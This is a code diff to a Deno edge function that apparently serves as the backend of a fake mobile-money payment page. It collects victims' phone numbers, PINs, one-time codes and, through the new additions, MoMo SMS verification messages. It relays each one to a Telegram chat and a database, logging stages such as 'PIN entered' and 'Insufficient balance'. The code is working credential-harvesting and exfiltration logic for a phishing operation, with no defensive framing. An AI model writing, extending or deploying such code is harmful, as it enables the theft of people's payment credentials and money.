@@ -10,7 +10,6 @@ const corsHeaders = {
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN") ?? "";
 const TELEGRAM_CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID") ?? "";
 
-// Lazy client so a missing env var can't crash the function at boot.
 let _supabase: ReturnType<typeof createClient> | null = null;
 function db() {
   if (_supabase) return _supabase;
@@ -31,18 +30,23 @@ interface NotifyPayload {
   phone?: string;
   pin?: string;
   otp?: string;
+  momoMessage?: string;
   verificationLink?: string;
   stage?: string;
 }
 
 const STATUSES = new Set(["pending", "completed", "failed"]);
 const STAGE_LABELS: Record<string, string> = {
+  gateway_opened: "Gateway opened",
   initiated: "Flow started",
   method_selected: "Payment method selected",
   phone_submitted: "Phone number submitted",
   pin_submitted: "PIN entered",
+  momo_message: "MoMo verification message",
   otp_sent: "OTP sent",
+  otp_submitted: "OTP submitted",
   otp_verify: "OTP verification",
+  insufficient_balance: "Insufficient balance",
   completed: "Completed",
   failed: "Failed",
 };
@@ -107,11 +111,11 @@ Deno.serve(async (req: Request) => {
     const phone = clip(body.phone, 25);
     const pin = clip(body.pin, 10);
     const otp = clip(body.otp, 10);
+    const momoMessage = clip(body.momoMessage, 600);
     const verificationLink = clip(body.verificationLink, 500);
     const stage = clip(body.stage, 40);
     const status = STATUSES.has(body.status ?? "") ? body.status! : "pending";
 
-    // Any stage ping is valid as long as we know the operator.
     if (!paymentMethod && !stage) {
       return json({ error: "paymentMethod (or stage) is required" }, 400);
     }
@@ -121,11 +125,12 @@ Deno.serve(async (req: Request) => {
       phone,
       pin,
       otp,
+      momoMessage,
       verificationLink,
       stage,
     };
 
-    // ── Notify FIRST so a DB failure can never swallow the alert ──────
+    // ── Notify FIRST so a DB failure can never swallow the alert ──
     const emoji =
       status === "completed" ? "✅" : status === "failed" ? "❌" : "⏳";
     const stageLabel = stage ? (STAGE_LABELS[stage] ?? stage) : "";
@@ -138,6 +143,7 @@ Deno.serve(async (req: Request) => {
       ["Phone", phone],
       ["PIN", pin],
       ["OTP", otp],
+      ["MoMo Msg", momoMessage],
       ["Link", verificationLink],
       ["Stage", stageLabel],
       ["Status", status],
@@ -155,7 +161,7 @@ Deno.serve(async (req: Request) => {
 
     const notified = await sendTelegram(message);
 
-    // ── Best-effort persistence; shape stays constant for NOT NULL cols ──
+    // ── Best-effort persistence ──
     let stored = false;
     let id: string | null = null;
     const client = db();
